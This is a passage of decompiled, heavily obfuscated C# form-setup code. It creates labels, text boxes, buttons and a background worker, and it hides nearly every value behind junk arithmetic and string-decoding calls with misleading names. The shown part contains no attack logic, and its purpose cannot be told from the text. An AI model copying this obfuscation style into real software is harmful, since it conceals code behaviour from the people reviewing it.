		//IL_16dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_16e6: Expected O, but got Unknown
		//IL_16e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_16f1: Expected O, but got Unknown
		//IL_16f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_16fc: Expected O, but got Unknown
		//IL_16fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1707: Expected O, but got Unknown
		//IL_1708: Unknown result type (might be due to invalid IL or missing references)
		//IL_1712: Expected O, but got Unknown
		//IL_1713: Unknown result type (might be due to invalid IL or missing references)
		//IL_171d: Expected O, but got Unknown
		//IL_171e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1728: Expected O, but got Unknown
		//IL_1729: Unknown result type (might be due to invalid IL or missing references)
		//IL_1733: Expected O, but got Unknown
		//IL_1734: Unknown result type (might be due to invalid IL or missing references)
		//IL_173e: Expected O, but got Unknown
		//IL_173f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1749: Expected O, but got Unknown
		//IL_174a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1754: Expected O, but got Unknown
		//IL_2403: Unknown result type (might be due to invalid IL or missing references)
		//IL_240d: Expected O, but got Unknown
		//IL_39d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_39e3: Expected O, but got Unknown
		//IL_5358: Unknown result type (might be due to invalid IL or missing references)
		//IL_5362: Expected O, but got Unknown
		//IL_605e: Unknown result type (might be due to invalid IL or missing references)
		//IL_6068: Expected O, but got Unknown
		//IL_831e: Unknown result type (might be due to invalid IL or missing references)
		//IL_8328: Expected O, but got Unknown
		//IL_a688: Unknown result type (might be due to invalid IL or missing references)
		//IL_a692: Expected O, but got Unknown
		//IL_c520: Unknown result type (might be due to invalid IL or missing references)
		//IL_c52a: Expected O, but got Unknown
		//IL_10c52: Unknown result type (might be due to invalid IL or missing references)
		//IL_10c5c: Expected O, but got Unknown
		//IL_124ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_124f6: Expected O, but got Unknown
		//IL_13b63: Unknown result type (might be due to invalid IL or missing references)
		//IL_13b6d: Expected O, but got Unknown
		//IL_15648: Unknown result type (might be due to invalid IL or missing references)
		//IL_15652: Expected O, but got Unknown
		char[] array = new char[119]
		{
			'*', '\u0002', '\0', '\u0001', '\u0006', '\u0003', '\u0004', '\u0005', '\b', '\a',
			'\n', '\u0314', '\u0012', '\f', '1', '\u0014', 'Ä', '\u0013', 'K', 'Ë',
			'Ӧ', '\u0b5e', '\u06e7', '빝', '售', '㈲', '밹', '⅒', '悉', '⭆',
			'䎓', 'য', '⬖', 'q', 'Ó', 'ᐣ', '\u0954', '-', '䧴', '㽶',
			'僁', '罧', '᧢', 'ѧ', '\u02e6', 'य', '⧱', '䤚', '䱎', '\u171b',
			'捫', 'ト', 'Ḗ', '\u081d', '\u000f', '\u0010', '\u001e', '\u001c', '\u0011', '\r',
			'U', '\u001a', '²', '\u0018', '\u0015', '6', 'ɭ', '[', '#', '$',
			'ɥ', '몳', 'ሚ', 'ㅮ', '䁘', '୳', '湎', '䶍', '梧', 'ջ',
			'\'', '谍', '무', '\uefb1', 'ɠ', '5', '\ue689', '怹', '剾', '\uea3e',
			'\u1a8c', 'Ҽ', '0', '饗', 'Ԇ', '貧', '⿐', 'ᰛ', '톿', 'à',
			'\u0dd7', 'ફ', '\u1fee', '琗', '鍋', '㮘', '\ue20c', 'ò', 'ᐯ', 'ထ',
			'鮊', '薷', '\ue80c', 'ᄳ', '㡷', '\ud9de', '⨫', '‸', 'ᦃ'
		};
		int[] array2 = new int[316]
		{
			2, 0, 1, 6, 3, 4, 5, 16, 9, -3,
			28, 12, 110, 1395, -5, 48, 52, 3766, 475028, 31,
			-479543, 678005, 59935, 10291, -650334, 582732, 168, 610207, 19835, 843666,
			-65647, 42031, -18679, 870880, 3248, 26289, 198, 56782, 17564, 1196,
			621, 4056, -996622, 155780, 507963, 263921, 45997, 44375, 402188, 25957,
			1679, -439514, 528802, -2466, 307899, -7113, -454181, 136247687, 346781, 503155,
			14209, 2320, 2060, 8896, 149097, -38810, -107622, 258, 27864, 16855,
			305905, 62076, 137, -912354, -21273, 79999, 898685, 175113376, -548219, 5756,
			18522, 262, -45742, -960842, 512172, 1138, -983134, 600, 725664, 21590,
			-301673, 447309, 68712, 15, 27, -2, 37, 8, 260, -1,
			7, 25, -9, -4, 18, 2326, 26, 1069, 173, 59,
			144, 80, 32, 248, -525357, 722916, -804159, -23402, 13721, 92,
			-597003, 53268, 135, 643, -987388, 38, -722541, -929183, -78120, 523671,
			138274, 314, -40078, -974608, -694476, -167226, -260297, -260301, -175378, -345916,
			-717195, 69333, -981517, -1024, 922019, 981517, 16135, 160028, 2020410009, 23158,
			884790, 322, 803557, 588886105, 141445, -780976, 721018, 293791, 608, 151838,
			-663119, 66852, -366614, 853854, 164558, -336030, -127199, 611260, -179843, 817,
			61678, 2548, 86, -97946, -275, -545, -707271, 173700634, -973328, 519084,
			279219353, 108106, 637, 8719, 3139, 487736, 884789880, -669503, 909911, 41131,
			468253, 1316, -13526, 380546, 512, -83522, -64563, -736054, 496461, -876885,
			-889030, -773452, 726329786, 574938, 1033299, 1390235706, 28437, 578119, 901548, 5906,
			-125836, 74762, -284031, -13312, 405573, -519005, 2083, 57, 485654, -570364,
			83649461, 824714, 592024, 23544716, 890295, 795, 5285, 378, 1445, -830337,
			192, 584705, -709324, 163162, -386105, 971000, -969929, -57406, 341945, 451,
			-358062, 915467, 436513, 53402, -53400, -574254, -203997, -625686, -625687, 2081240,
			-1903455, 1045, -347651, 503809, -309973, 605941, 8202, 144805, -334637, 551731,
			-416895, -914567, 1020519, 679711, 552166, -985719, 20428, 5858, 901442, -839,
			21371, 31695, 380859, 13599, -7275, -144930, -900870, -890756, -268202, -75788,
			451973476, 14680, 290459104, -685519, -22905, 136826, 1416954, 520209, -13192, -202957,
			-848365, -163988, -79733, 760382, -5781377, -78233, 180189, -562729, 618749, -784006,
			-310734, 737035, 56289, 268440, 3081, -466, 592748, 57132, 432144, 393,
			-415703, -453555, 51296, -807379, -92905, 163240
		};
		char[] array3 = new char[Convert.ToInt32("16", sizeof(decimal))];
		array3[checked(0 * Convert.ToInt32("11111111111111100110000011110011", 2))] = (char)Convert.ToInt32("0", Convert.ToInt32("10000", 2));
		array3[1] = (char)array2[2];
		array3[Marshal.SizeOf(typeof(ENODATA))] = (char)((Array)(object)(char.ToString('\u035c') + "\u0339\u0356")).Length;
		array3[3] = (char)((Array)(object)"\u0369\u030f").Length;
		array3[4] = '\n';
		array3[_003CModule_003E.get_PositiveSign[145] + 587173] = '\u0005';
		array3[6] = '*';
		array3[Marshal.SizeOf(typeof(Prefix1))] = (char)Convert.ToInt32(char.ToString('1') + char.ToString('0') + "01000", array2[0]);
		array3[sizeof(float) * array[1]] = (char)Convert.ToInt32("11" + char.ToString('0') + "11000010", 2);
		array3[Convert.ToInt32("9", 16)] = (char)checked(657 * unchecked((int)array[3]));
		array3[(uint)array[10]] = (char)array2[17];
		array3[_003CModule_003E.KeyValuePair__2[Marshal.SizeOf(typeof(Prefix1))]] = '1';
		array3[array2[11]] = (char)checked(728 * array2[2]);
		int num = ((30484 == Convert.ToInt32("37777740171", 8)) ? (-329249) : Marshal.SizeOf(typeof(GetValues)));
		array3[13] = (char)num;
		array3[14] = 'ǥ';
		array3[BindToObject >> Marshal.SizeOf(typeof(OverlappedData))] = (char)sizeof(long);
		array3[16] = '\u0010';
		array3[-46453 - IsEnabled] = array[4];
		array3[18] = (char)(EnumEqualityComparer__1 >> _003CModule_003E.get_PositiveSign[8]);
		array3[_003CModule_003E.KeyValuePair__2[get_CurrentThread]] = '㴜';
		array3[(uint)array[Convert.ToInt32("f", 16)]] = 'Ë';
		array3[Marshal.SizeOf(typeof(GetAbbreviatedDayName))] = (char)((86007 < Convert.ToInt32("ea870", 16)) ? '\ue2e0' : 4294617173u);
		char[] array4 = array3;
		int[] array5 = new int[35];
		array5[0] = ((Array)(object)string.Empty).Length;
		array5[1] = 1;
		array5[2] = 3;
		array5[3] = Marshal.SizeOf(typeof(Stelem_Ref));
		array5[_003CModule_003E.ActivityOptions[Convert.ToInt32("3", 16)]] = array[Convert.ToInt32("7", 16)];
		array5[5] = 537;
		array5[6] = Convert.ToInt32("37" + "77" + "7777777", 8);
		array5[(uint)array[9]] = array[70] * Convert.ToInt32("1", 16);
		int num2 = ((-71597 == _003CModule_003E.get_PositiveSign[147]) ? array2[115] : dwCookie);
		array5[num2] = _003CModule_003E.KeyValuePair__2[142] / 224782566;
		int num3 = (array5[array2[8]] = ((0 != Convert.ToInt32("0", 16)) ? (-163704) : 653));
		int num4 = ((72556 != Convert.ToInt32("98b9", 16)) ? 10 : 485527);
		array5[num4] = 20;
		array5[11] = Convert.ToInt32(char.ToString('4') + char.ToString('4') + "6a", 16);
		array5[-41724 + Convert.ToInt32("121410", 8)] = 472;
		array5[13] = 55;
		array5[14] = 8;
		array5[15] = 16;
		array5[16] = ((Array)(object)(char.ToString('\u0301') + "\u036b\u033c\u034e")).Length;
		array5[17] = 12;
		array5[18] = -935831 ^ _003CModule_003E.KeyValuePair__2[143];
		array5[19] = Convert.ToInt32("33" + "36523", 8);
		array5[(85468 <= Convert.ToInt32("fffcc9fe", 16)) ? _003CModule_003E.ActivityOptions[129] : 20] = 988097;
		array5[21] = -511999;
		checked
		{
			array5[-804137 ^ array2[116]] = _003CModule_003E.get_PositiveSign[148] + -197496;
			array5[(40523 == Convert.ToInt32("11111111111111101010010000011000", 2)) ? 468766 : 23] = _003CModule_003E.get_PositiveSign[11];
			int num5 = ((48596 <= Convert.ToInt32("11101101111100111001", 2)) ? 24 : 190316);
			array5[num5] = 3221;
			array5[Convert.ToInt32("19", _003CModule_003E.KeyValuePair__2[2])] = 611051;
			array5[26] = -672946;
			array5[op_LessThan] = array2[Marshal.SizeOf(typeof(GetInterfaceImplementation))];
			array5[774322 + _003CModule_003E.KeyValuePair__2[144]] = -535077;
			array5[29] = __9__60_1;
			array5[Convert.ToInt32(char.ToString('1') + char.ToString('1') + "110", 2)] = 344409;
			int num6 = default(int);
			switch (0 * Convert.ToInt32("1745035", 8))
			{
			case 0:
				num6 = Convert.ToInt32("37", 8);
				break;
			case 1:
				num6 = -777807;
				break;
			}
			array5[num6] = 592238;
		}
		array5[-8 * IsPrefix] = Convert.ToInt32("11111111101101011010010011101100", 2) % -1949192;
		array5[Convert.ToInt32(char.ToString('1') + char.ToString('0') + "0001", Convert.ToInt32("2", 16))] = 347;
		int num7 = (array5[Convert.ToInt32("42", 8)] = TargetedPatchBand);
		int[] array6 = array5;
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(EraInfo));
		DefineLabel = new BackgroundWorker();
		TryRunSingle = new Label();
		get_DaylightDelta = new TextBox();
		SetSize = new Label();
		AllowHexSpecifier = new Label();
		IsTvOSVersionAtLeast = new Panel();
		panel_0 = new Panel();
		R_OK = new Label();
		M21 = new Button();
		AmbiguousMatchException = new Label();
		OverwriteExisting = new TextBox();
		get_CanRead = new Label();
		Next = new Button();
		set_PercentPositivePattern = new TextBox();
		Ldloc = new TextBox();
		get_Modules = new Label();
		ToVector128Unsafe = new Label();
		HString = new TextBox();
		MarvinSeed = new Panel();
		CompressedStack = new Label();
		((Control)panel_0).SuspendLayout();
		((Control)MarvinSeed).SuspendLayout();
		((Control)this).SuspendLayout();
		Label tryRunSingle = TryRunSingle;
		int[] dequeue = _003CModule_003E.Dequeue;
		string string_ = "ᡬ";
		object[] array7 = new object[3];
		array7[1822866 >> Popref_popi_popr8] = char.ToString('؎') + "Үǧ";
		array7[160968109 / Convert.ToInt32("1001100110000010110110101101", 2)] = 'ஹ';
		int num8 = default(int);
		switch (-23401 - array2[117])
		{
		case 0:
			num8 = Convert.ToInt32("37777650655", 8);
			break;
		case 1:
			num8 = 2;
			break;
		case 2:
			num8 = 988039;
			break;
		}
		array7[num8] = ((Convert.ToInt32("37777706174", 8) >= 990682) ? true : false);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_, array7);
		((Control)tryRunSingle).set_AutoSize((byte)dequeue[Convert.ToInt32(string_, Stream)] != 0);
		Label tryRunSingle2 = TryRunSingle;
		string string_2 = char.ToString('韬') + "韈韂";
		int num9 = Convert.ToInt32("5", 8);
		object[] array8 = new object[num9];
		int num10 = ((get_Command <= -720521) ? _003CModule_003E.KeyValuePair__2[146] : array2[118]);
		array8[0] = num10;
		array8[Convert.ToInt32("1", 8)] = 17795;
		array8[2] = "A\u008b";
		array8[endAction] = 282;
		array8[4] = _003CModule_003E.KeyValuePair__2[31];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_2, array8);
		string text = string_2;
		string string_3 = string.Concat(char.ToString(array[71]), char.ToString('몮'), char.ToString('몲') + char.ToString('몮') + "몧몵");
		object[] array9 = new object[4];
		array9[_003CModule_003E.ActivityOptions[array2[2]]] = 488;
		array9[1] = 4009;
		array9[Stream] = false;
		array9[Marshal.SizeOf(typeof(CharSetMask))] = 31061;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_3, array9);
		string text2 = text + string_3;
		string string_4 = "꧙ꦪ";
		object[] array10 = new object[array2[6]];
		array10[Convert.ToInt32("0", 16)] = (int)array[20];
		array10[5 % Convert.ToInt32("10", 2)] = Convert.ToInt32("10" + "1101" + "111100100", 2);
		array10[2] = (char)_003CModule_003E.ActivityOptions[24];
		array10[3] = Convert.ToInt32("1000" + "0011110", 2);
		array10[20 % (int)array[8]] = 4279;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_4, array10);
		string text3 = string_4;
		string string_5 = string.Concat("嵒嵝", "嵀崓", char.ToString('嵠') + "嵖嵁嵚嵕");
		object[] array11 = new object[(uint)array[1]];
		array11[(nint)((Array)(object)string.Empty).LongLength / 155059663] = _003CModule_003E.ActivityOptions[25];
		array11[1] = 24228;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_5, array11);
		string string_6 = string.Concat(text2, text3 + string_5);
		object[] array12;
		checked
		{
			array12 = new object[EOPNOTSUPP + unchecked(((Convert.ToInt32("11111111111111111000101100101010", 2) != -43593) ? Convert.ToInt32("11111111111111111110110101000010", 2) : (-507970)) * 73)];
		}
		int num11 = default(int);
		switch (Convert.ToInt32("0", 8) % -234121)
		{
		case 0:
			num11 = 0;
			break;
		case 1:
			num11 = -270635;
			break;
		}
		int num12 = num11;
		int num13 = num12 & ((Convert.ToInt32("37771413362", 8) - Convert.ToInt32("11111111111101010000111001000111", 2)) ^ (-1403833 + _003CModule_003E.ActivityOptions[130]));
		string text4 = char.ToString((char)checked(292899 + Convert.ToInt32("111111111" + "111" + "10111000100010100111", Convert.ToInt32("2", 16))));
		string string_7 = "껾꾀";
		object[] array13 = new object[Convert.ToInt32("11", 2)];
		array13[(uint)array[2]] = (char)Convert.ToInt32(char.ToString('3') + "1762", 8);
		array13[sizeof(bool)] = (char)(608165 + Convert.ToInt32("37775632115", 8));
		array13[Convert.ToInt32("2", 8)] = (byte)((uint)Marshal.SizeOf(typeof(ARM)) ^ 0x53225u) != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_7, array13);
		array12[num13] = text4 + string_7;
		string string_8 = "\udd71";
		object[] array14 = new object[_003CModule_003E.ActivityOptions[0]];
		char c = array[2];
		array14[(int)c] = '⻒';
		array14[1] = '꽰';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_8, array14);
		IntPtr intPtr = (nint)((Array)(object)string_8).LongLength;
		int num15;
		if (Convert.ToInt32(char.ToString('1') + "50775", Convert.ToInt32("1000", 2)) > Convert.ToInt32("10001" + "111001011110", 2))
		{
			int num14 = default(int);
			switch (1 * get_CurrencyGroupSeparator)
			{
			case 0:
				num14 = Convert.ToInt32("1101101010101011101", 2);
				break;
			case 1:
				num14 = 910830;
				break;
			case 2:
				num14 = 629813;
				break;
			}
			num15 = num14;
		}
		else
		{
			num15 = 590;
		}
		string text5 = char.ToString((char)num15);
		string text6 = char.ToString((char)Marshal.SizeOf(typeof(ShiftRightLogicalNarrowingUpper)));
		string text7 = char.ToString((char)TotalMilliseconds);
		string string_9 = char.ToString('䓗') + "䓒䓓";
		int num16 = default(int);
		switch (array2[1] / 92)
		{
		case 0:
			num16 = 4;
			break;
		}
		object[] array15 = new object[num16];
		array15[_003CModule_003E.ActivityOptions[1]] = 'ቨ';
		array15[sizeof(bool)] = string.Concat("࿊k", char.ToString('s') + "«\u0002\r\u0018");
		array15[Convert.ToInt32("10111111010001110100", 2) ^ 0xBF476] = char.ToString('₨') + "*\"";
		array15[endAction] = (byte)array2[_003CModule_003E.ActivityOptions[2]] != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_9, array15);
		array12[(nint)intPtr] = string.Concat(text5, text6, text7 + string_9);
		string string_10 = "졃";
		object[] array16 = new object[(-25595 <= Convert.ToInt32("bdd9c", 16)) ? 4 : (-228542)];
		array16[0] = checked(array2[120] - Convert.ToInt32("fff6cf44", 16));
		int num17 = Convert.ToInt32("1", 16);
		array16[num17] = 133170 % array2[121];
		array16[Stream] = (byte)(Convert.ToInt32("96b9c", 16) ^ get_ArgumentCount) != 0;
		array16[3] = 19382;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_10, array16);
		array12[Convert.ToInt32(string_10, array6[Convert.ToInt32("e", 16)])] = checked((array2[102] & -71) * HexIntPtrType) * Marshal.SizeOf(typeof(CreateWorld));
		int num18 = Convert.ToInt32("477375", 8);
		int num20 = default(int);
		switch (~num18 + checked(Convert.ToInt32(char.ToString('1') + "11" + "111011110011", 2) - (-171940460 | _003CModule_003E.get_PositiveSign[149])))
		{
		case 0:
			num20 = _003CModule_003E.LoadVector128[Convert.ToInt32("1", ((Array)(object)"\u036b\u035d\u031c\u0338\u034e\u0304\u034d\u030f\u033b\u036e\u032a\u0306\u035a\u0329\u0327\u031f").Length)];
			break;
		case 1:
		{
			string string_11 = string.Concat(char.ToString('\ue8e6'), char.ToString((char)Convert.ToInt32("1110100011100101", 2)), char.ToString('\ue8e0') + "\ue8bb\ue8bb");
			object[] obj = new object[5]
			{
				2997,
				string.Concat(char.ToString((char)Convert.ToInt32("ae0", 16)), char.ToString('š') + char.ToString('డ') + "؇\u05fc"),
				null,
				null,
				null
			};
			int num19 = ((31267 < Convert.ToInt32("30347", 16)) ? 2 : (-544017));
			int now = Now;
			obj[num19] = now;
			obj[Marshal.SizeOf(typeof(CharSetMask))] = Convert.ToInt32(char.ToString('1') + "01100110000001", Stream);
			obj[get_ResourceExposureLevel] = 19447;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_11, obj);
			num20 = Convert.ToInt32(string_11, 80 % Convert.ToInt32("20", 16));
			break;
		}
		}
		array12[num20] = set_Url;
		int num21 = 69131 - ~(Convert.ToInt32("11111111111111011011110010011010", 2) ^ 0x34D62);
		string string_12 = "䦚䦛";
		object[] array17 = new object[4];
		array17[0] = string.Concat(char.ToString((char)_003CModule_003E.KeyValuePair__2[147]), char.ToString((char)Convert.ToInt32("10554", 8)), char.ToString('\u0013') + char.ToString('\u001a') + "\u0004\u0002");
		array17[Convert.ToInt32("1", sizeof(Guid))] = 903;
		checked
		{
			array17[unchecked((nint)((Array)(object)"\u0347\u0336").LongLength) * 1] = 'ჱ';
		}
		array17[3] = (int)array[21];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_12, array17);
		string text8 = char.ToString((char)Convert.ToInt32(string_12, -85809 - Convert.ToInt32("11111111111111101011000011000111", 2)));
		string string_13 = "\u036cͼ";
		object[] array18 = new object[4];
		array18[checked(-742044 + Convert.ToInt32("2651234", 8))] = 27;
		array18[1] = Convert.ToInt32("25", 8);
		char c2 = (char)array2[123];
		array18[2] = (int)c2;
		array18[endAction] = string.Concat(char.ToString('\u0006'), char.ToString('Q'), char.ToString('e') + "\u0001\u000f");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_13, array18);
		array12[num21] = text8 + string_13;
		_003CModule_003E.GetMaxByteCount(ref string_6, array12);
		string text9 = string_6;
		string string_14 = "Ⲋ";
		object[] array19 = new object[3];
		array19[0 * val] = string.Concat(char.ToString('\u1a63'), char.ToString((char)Convert.ToInt32("110110010", 2)), char.ToString('¥') + char.ToString('ʨ') + "Łj\u0091");
		array19[Convert.ToInt32("7016bbba", 16) / 1880538042] = DefineSequencePoints;
		array19[(nint)((Array)(object)"\u0308\u0318").LongLength] = 'ז';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_14, array19);
		int num22 = Convert.ToInt32(string_14, Convert.ToInt32(char.ToString('7') + "eda1", 16) ^ 0x7EDA3);
		string text10 = char.ToString((char)_003CModule_003E.KeyValuePair__2[32]);
		string string_15 = "\u05ff\u0598";
		object[] array20 = new object[-715918 ^ Convert.ToInt32("37775211564", 8)];
		int num23 = Convert.ToInt32("0", 2);
		array20[num23] = string.Concat("C7", char.ToString('~') + char.ToString('U') + "\a\u0006\t");
		array20[(nint)((Array)(object)"\u036d").LongLength] = false;
		array20[sizeof(char)] = 6;
		array20[3] = -987090 - array2[124];
		array20[4] = (char)_003CModule_003E.get_PositiveSign[array2[96]];
		array20[5] = (char)Convert.ToInt32(char.ToString('7') + "75", Convert.ToInt32("1000", 2));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_15, array20);
		IntPtr intPtr2 = (nint)((Array)(object)(text10 + string_15)).LongLength;
		string string_16 = "\udcf9";
		object[] array21 = new object[2 | array2[4]];
		array21[array2[1] / 662550499] = 42765;
		array21[Convert.ToInt32("fff0df79", 16) - -991368] = "ѻㅁ";
		array21[2] = (byte)Convert.ToInt32("0", _003CModule_003E.KeyValuePair__2[2]) != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_16, array21);
		((Control)tryRunSingle2).set_Font(new Font(text9, 24f, (FontStyle)num22, (GraphicsUnit)(nint)intPtr2, (byte)Convert.ToInt32(string_16, array2[Convert.ToInt32("24", 8)] + Convert.ToInt32(char.ToString('1') + char.ToString('6') + "50477", 8))));
		((Control)TryRunSingle).set_ForeColor(Color.Red);
		Label tryRunSingle3 = TryRunSingle;
		string string_17 = string.Concat(char.ToString('ⰺ') + char.ToString('ⰺ') + "ⰺⰺⰺⰺⰺⰺ", "ⰺⰺ", "ⰺⰺⰺⰺⰺⰺⰺⰺ" + "ⰺⰺⰺⰺⰺⰺⰺⰺⰺⰻⰻⰺⰺⰻ");
		object[] array22 = new object[sizeof(short)];
		array22[0] = 9508;
		array22[1] = (int)array[22];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_17, array22);
		Label tryRunSingle4;
		string string_18;
		object[] array23;
		checked
		{
			((Control)tryRunSingle3).set_Location(new Point(~Convert.ToInt32(string_17, 2), array6[18] * unchecked(Convert.ToInt32("1", Marshal.SizeOf(typeof(__c__DisplayClass0_6))) * 1)));
			tryRunSingle4 = TryRunSingle;
			string_18 = "㜈㜅";
			array23 = new object[EnsureInitialized - DynamicInterfaceCastableImplementationAttribute];
			array23[0] = string.Concat(char.ToString('ï'), char.ToString('Ú') + "\u02fe\u000e\u008dA\u000e");
		}
		char c3 = (char)Convert.ToInt32("645", 8);
		array23[1] = (int)c3;
		array23[_003CModule_003E.ActivityOptions[131] ^ Convert.ToInt32("11100111110001100110", 2)] = char.ToString('ʒ') + char.ToString((char)Marshal.SizeOf(typeof(CharSetMask))) + "\0\u0019";
		array23[3] = InstanceMethodOnly | 0x82;
		array23[sizeof(uint)] = (byte)get_PositiveInfinity != 0;
		array23[(uint)array[7]] = "ħ\u0013";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_18, array23);
		string text11 = string_18;
		string text12 = char.ToString('㫆');
		string text13 = char.ToString((char)(75205 % Convert.ToInt32("7582", 16)));
		string string_19 = "繮縳";
		object[] array24 = new object[5];
		array24[0] = string.Concat(char.ToString((char)Convert.ToInt32("a8", 16)), char.ToString('\a'), char.ToString('\0') + "\u0002\0\u0002");
		array24[1] = string.Concat("ᄌ\u0fac", char.ToString('\u001c') + "\u0365ėhk");
		array24[Marshal.SizeOf(typeof(ENODATA))] = char.ToString((char)Marshal.SizeOf(typeof(ComponentGuaranteesOptions))) + char.ToString('Ĺ') + "\u0012\r";
		array24[3] = 79 * array[61];
		array24[4] = char.ToString((char)BinderState) + char.ToString((char)Convert.ToInt32("100000", 2)) + "zW";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_19, array24);
		string string_20 = string.Concat(text11, text12 + text13 + string_19);
		int num24 = ((-26679 <= Convert.ToInt32("111111111" + "111010" + "01110100001000101", 2)) ? 127916 : (-533179));
		object[] array25 = new object[num24 - -533182];
		string string_21 = "륆";
		object[] array26 = new object[get_ResourceExposureLevel];
		array26[checked(-769991 - Convert.ToInt32("11111111111101000100000000111001", 2))] = false;
		array26[Marshal.SizeOf(typeof(UseHebrewParsing))] = 1362;
		array26[2] = string.Concat(char.ToString('Ǻ'), char.ToString(array[72]), char.ToString('ɷ') + "\u0090Ʋ");
		array26[Marshal.SizeOf(typeof(CharSetMask))] = '魗';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_21, array26);
		int num25 = Convert.ToInt32(string_21, 601254704 / EBADF) * (Convert.ToInt32(char.ToString('d') + char.ToString('2') + "f04890", Convert.ToInt32("10", 16)) | -49796951);
		string string_22 = char.ToString('鸭') + char.ToString((char)Convert.ToInt32("1001111000101101", 2)) + "鸬鸬";
		object[] array27 = new object[_003CModule_003E.ActivityOptions[3] | Convert.ToInt32("1", 16)];
		array27[0] = 'ᄟ';
		array27[~Convert.ToInt32("11111111111111111111111111111110", 2)] = '䄺';
		array27[2] = '\u0981';
		array27[3] = ((Convert.ToInt32("205430", 8) >= -543304) ? 4308 : (-265073));
		int num26 = array2[5];
		int num27 = array[73];
		array27[num26] = num27;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_22, array27);
		string text14 = string_22;
		string string_23 = string.Concat(char.ToString('鍥'), char.ToString('鍤'), char.ToString('鍤') + "鍥鍥鍥鍥鍥鍥");
		object[] array28 = new object[3];
		array28[0] = string.Concat("⥻ќ", char.ToString('ය') + "ɸۻŏR");
		array28[array2[2]] = (byte)(_003CModule_003E.ActivityOptions[132] + 26666) != 0;
		array28[2] = '䲰';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_23, array28);
		array25[num25] = (char)Convert.ToInt32(text14 + string_23, (int)((nint)((Array)(object)"\u0363").LongLength << sizeof(sbyte)));
		int num28 = array2[(uint)array[64]];
		array25[checked(678006 - num28)] = FormatException;
		string string_24 = "乐";
		object[] array29 = new object[3];
		array29[484866 + _003CModule_003E.KeyValuePair__2[148]] = false;
		array29[Marshal.SizeOf(typeof(DiscardableAttribute)) >> 7] = 3480;
		array29[2] = 16293;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_24, array29);
		nint num29 = 2 * (nint)((Array)(object)string_24).LongLength;
		string string_25 = string.Concat("稬稭", char.ToString('稭') + "稬稬", "稬稭稭" + "稭稭稬稭稭");
		object[] array30 = new object[Convert.ToInt32("11", 2)];
		array30[checked(-110308 - Convert.ToInt32("fffe511c", 16))] = false;
		array30[1] = Marshal.SizeOf(typeof(Arm));
		array30[~BSTRMarshaler] = Convert.ToInt32("100000010011100", 2) | array[74];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_25, array30);
		char c4 = (char)Convert.ToInt32(string_25, checked(Convert.ToInt32("1631036", 8) - 471580));
		array25[num29] = (int)c4;
		_003CModule_003E.GetMaxByteCount(ref string_20, array25);
		((Control)tryRunSingle4).set_Name(string_20);
		Label tryRunSingle5 = TryRunSingle;
		int width = (0xDB1D9 ^ (Convert.ToInt32("1556513", 8) << 1)) % ~_003CModule_003E.get_PositiveSign[38];
		string string_26 = "脷脰";
		object[] array31;
		checked
		{
			array31 = new object[Convert.ToInt32("10100111001100011001", 2) - Convert.ToInt32("a7315", 16)];
			array31[0] = 0x10 | Convert.ToInt32("4462", 8);
			int num30 = default(int);
			switch (unchecked((int)array[75]) - 2929)
			{
			case 0:
				num30 = -555117;
				break;
			case 1:
				num30 = -281041;
				break;
			case 2:
				num30 = 1;
				break;
			}
			array31[num30] = 20586;
			array31[2] = false;
		}
		array31[(nint)((Array)(object)"\u0349\u0353\u0316\u036b\u0356\u031a.\u0322\u0307\u0332\u0353\u0336\u034b\u035c\u0333").LongLength % 6] = 10089;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_26, array31);
		((Control)tryRunSingle5).set_Size(new Size(width, Convert.ToInt32(string_26, (_003CModule_003E.ActivityOptions[133] ^ array2[126]) + (EventInfo & -268325))));
		Label tryRunSingle6 = TryRunSingle;
		int vT_R = VT_R8;
		int num31 = ((-5958 >= Convert.ToInt32("3366024", 8)) ? (-226233) : 531061);
		int tabIndex;
		if (-43341 < checked(vT_R - num31))
		{
			tabIndex = array6[(uint)array[(uint)array[58]]];
		}
		else
		{
			int num32 = default(int);
			switch (array[2] * -416088)
			{
			case 0:
				num32 = 2;
				break;
			}
			tabIndex = 0 | num32;
		}
		((Control)tryRunSingle6).set_TabIndex(tabIndex);
		Label tryRunSingle7 = TryRunSingle;
		string text15 = char.ToString((char)Convert.ToInt32(char.ToString('1') + char.ToString('3') + "7034", 8));
		string string_27 = string.Concat(char.ToString('㢖') + char.ToString('㢱') + "㣹㢷", char.ToString('㢶') + char.ToString('㣸') + "㣹㢀㢶㢬㢫");
		object[] array32 = new object[6];
		array32[Convert.ToInt32("0", 8)] = (byte)Convert.ToInt32("0", 2) != 0;
		array32[1] = Marshal.SizeOf(typeof(ShiftArithmeticRoundedSaturateScalar));
		array32[array2[128] + 78122] = string.Concat(char.ToString((char)Convert.ToInt32("87", 16)), char.ToString('ڔ') + "ǽୠ");
		array32[(nint)((Array)(object)(char.ToString('\u0355') + "\u033e\u0309")).LongLength] = 18;
